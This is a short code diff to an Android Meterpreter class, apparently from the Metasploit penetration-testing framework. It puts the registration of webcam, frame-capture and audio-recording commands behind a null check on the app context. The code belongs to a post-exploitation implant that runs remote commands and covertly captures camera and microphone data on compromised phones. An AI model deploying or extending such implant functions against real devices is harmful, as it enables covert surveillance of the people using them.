@@ -78,11 +78,13 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand("stdapi_sys_config_sysinfo", stdapi_sys_config_sysinfo.class);
         mgr.registerCommand("stdapi_sys_process_execute", stdapi_sys_process_execute_V1_3.class);
         mgr.registerCommand("stdapi_sys_process_get_processes", stdapi_sys_process_get_processes_android.class);
-        mgr.registerCommand("webcam_audio_record", webcam_audio_record_android.class);
-        mgr.registerCommand("webcam_list", webcam_list_android.class);
-        mgr.registerCommand("webcam_start", webcam_start_android.class);
-        mgr.registerCommand("webcam_stop", webcam_stop_android.class);
-        mgr.registerCommand("webcam_get_frame", webcam_get_frame_android.class);
+        if (context != null) {
+            mgr.registerCommand("webcam_audio_record", webcam_audio_record_android.class);
+            mgr.registerCommand("webcam_list", webcam_list_android.class);
+            mgr.registerCommand("webcam_start", webcam_start_android.class);
+            mgr.registerCommand("webcam_stop", webcam_stop_android.class);
+            mgr.registerCommand("webcam_get_frame", webcam_get_frame_android.class);
+        }
         return getCommandManager().getNewCommands();
     }
 }
